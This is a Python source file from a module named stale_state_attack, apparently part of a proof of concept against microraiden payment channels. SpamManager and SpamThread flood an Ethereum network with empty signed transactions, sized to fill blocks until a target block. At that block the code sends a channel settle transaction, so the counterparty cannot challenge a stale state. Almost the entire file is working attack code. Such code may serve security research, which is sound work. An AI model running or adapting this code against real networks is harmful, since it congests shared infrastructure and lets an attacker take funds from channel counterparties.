#!/usr/bin/python

import threading
import time
import logging
from collections import deque
from microraiden.stale_state_attack.config import (
    GAS_PRICE,
    GAS_LIMIT,
    BLOCK_SIZE,
    MAX_TX_QUEUE_SIZE,
)
from microraiden.utils import privkey_to_addr
from microraiden.stale_state_attack.utils import create_signed_transaction


class SpamManager(threading.Thread):
    '''
    The SpamManager class can be used to generate a blockchain congestion.
    '''

    def __init__(
        self,
        web3,
        private_key: str,
        number_threads: int=1,
        nonce_offset: int=0,
        challenge_period: int=500,
        create_settle_transaction=None,
    ):
        global tx_counter, tx_sent_counter, tx_queue, desired_queued_txs, do_send

        self.web3 = web3
        self.private_key = private_key
        self.number_threads = number_threads
        self.nonce_offset = nonce_offset
        self.challenge_period = challenge_period
        self.create_settle_transaction = create_settle_transaction

        self.do_run = False
        self.logger = logging.getLogger('spamming')
        self.threads = []

        self.initial_nonce = self.web3.eth.getTransactionCount(
            privkey_to_addr(self.private_key), 'pending') + self.nonce_offset
        self.target_block = None
        self.settle_sent = False

        tx_counter = 0
        tx_sent_counter = 0
        tx_queue = deque()
        do_send = False
        desired_queued_txs = self.desired_pending_txs() - int(self.web3.txpool.status.pending, 16)

        # Initialize and start spamming worker threads
        for i in range(self.number_threads):
            thread = SpamThread(
                web3=self.web3,
                private_key=self.private_key,
                initial_nonce=self.initial_nonce,
            )
            self.threads.append(thread)
            thread.start()

        threading.Thread.__init__(self)

    def run(self):
        global tx_counter, do_send, desired_queued_txs

        self.do_run = True
        do_send = True

        while self.do_run:
            if (self.target_block_reached()) & (not self.settle_sent):
                # Create and send a settle transaction
                nonce = self.web3.eth.getTransactionCount(
                    privkey_to_addr(self.private_key), 'pending')
                settle_tx = self.create_settle_transaction(nonce)

                try:
                    tx_hash = self.web3.eth.sendRawTransaction(settle_tx)
                    self.logger.info('Sent settle transaction (tx={})'.format(tx_hash.hex()))
                    self.settle_sent = True
                    do_send = True
                except Exception as e:
                    self.logger.error('Sending settle transaction failed: {}'.format(e))
            else:
                pending_transactions = int(self.web3.txpool.status.pending, 16)
                do_send = pending_transactions < self.desired_pending_txs()
                desired_queued_txs = min(self.desired_pending_txs() -
                                         pending_transactions, MAX_TX_QUEUE_SIZE)

                if self.target_block is not None:
                    self.logger.debug(
                        'Current block = {} / Target block = {}'.format(self.web3.eth.blockNumber, self.target_block))
                    self.logger.info('Pending transactions = {} / Desired Pending = {} / Queued transactions = {} / Threads = {} / Target block = {} / Remaining blocks = {}'.format(
                        pending_transactions, self.desired_pending_txs(), len(tx_queue), threading.active_count(), self.target_block, self.target_block - self.web3.eth.blockNumber))
                else:
                    self.logger.debug('Current block = {}'.format(self.web3.eth.blockNumber))
                    self.logger.info('Pending transactions = {} / Desired Pending = {} / Queued transactions = {} / Threads = {}'.format(
                        pending_transactions, self.desired_pending_txs(), len(tx_queue), threading.active_count()))

            time.sleep(1)

    def update_target_block(self, block_number):
        '''
        Update the number of the target block until which the network
        shall be spammed. As soon as this block is created by the blockchain
        network, a channel settle request will be sent.
        '''
        self.target_block = block_number

    def target_block_reached(self) -> bool:
        '''
        Returns True if the target block number has already been created.
        '''
        if self.target_block is None:
            return False
        return self.web3.eth.blockNumber >= self.target_block

    def number_sent_transactions(self) -> int:
        '''
        Returns the number of spammed transactions.
        '''
        return tx_sent_counter

    def queued_transactions(self) -> int:
        '''
        Returns the number of created signed transaction which
        are in the queue of the transactions to be sent next.
        '''
        return tx_queue

    def wait_for_full_tx_queue(self) -> int:
        '''
        Wait until the queue of transactions to be sent next
        has reached the minimum number of transactions.
        '''
        global desired_queued_txs
        while len(tx_queue) < desired_queued_txs:
            time.sleep(0.25)

    def remaining_blocks(self) -> int:
        '''
        Return the number of blocks until the target block.
        '''
        if self.target_block is None:
            return self.challenge_period
        return max(0, self.target_block - self.web3.eth.blockNumber)

    def desired_pending_txs(self) -> int:
        return (self.remaining_blocks() + 2) * BLOCK_SIZE

    def stop(self):
        '''
        Stop the execution of this and all spam worker threads.
        '''
        self.do_run = False
        for thread in self.threads:
            thread.stop()
        self.logger.info('Stopped network spamming')


class SpamThread(threading.Thread):
    '''
    The SpamThread class can be used to repeatedly send empty spam transactions
    into a blockchain network.
    '''

    def __init__(
        self,
        web3,
        private_key: str,
        initial_nonce: int = 0,
    ):
        self.web3 = web3
        self.private_key = private_key
        self.initial_nonce = initial_nonce

        self.account_address = privkey_to_addr(private_key)
        self.do_run = True
        self.logger = logging.getLogger('spammer')

        threading.Thread.__init__(self)

    def run(self):
        '''
        Repeadedly create and send spam transactions.
        '''
        global tx_queue, do_send, desired_queued_txs

        self.do_run = True

        while self.do_run:
            if do_send:
                # If congestion level is not reached yet, send the next transaction
                self.send_next_transaction()
                continue

            if desired_queued_txs > 0:
                # Only create another transaction if sending mode is not active
                self.create_next_transaction()

    def send_next_transaction(self):
        '''
        Sends the next transaction from the global transaction queue.
        If the queue is empty, create a new signed transaction instead.
        '''
        global tx_sent_counter, tx_queue, do_send, desired_queued_txs

        if tx_queue:
            try:
                # Send next transaction from queue
                if do_send:
                    tx = tx_queue.popleft()
                    self.web3.eth.sendRawTransaction(tx)
                    tx_sent_counter += 1
            except ValueError as e:
                self.logger.error('Sending transaction failed: {}'.format(e))
            except Exception as e:
                tx_queue.appendleft(tx)
                self.logger.error('Sending transaction failed: {}'.format(e))
                self.logger.info('Trying to resend transaction')
        elif desired_queued_txs > 0:
            # If queue is empty, create a new spam transaction
            self.create_next_transaction()

    def create_next_transaction(self):
        '''
        Create a new spam transaction and append it to the global transaction queue.
        '''
        global tx_counter, tx_queue

        tx_counter += 1
        nonce = self.initial_nonce + tx_counter - 1
        tx = create_signed_transaction(
            private_key=self.private_key,
            web3=self.web3,
            to=self.account_address,
            nonce=nonce,
            data=str(time.time()),
            gas_price=GAS_PRICE,
            gas_limit=GAS_LIMIT
        )
        tx_queue.append(tx)

    def stop(self):
        '''
        Stop the execution of this thread.
        '''
        self.do_run = False
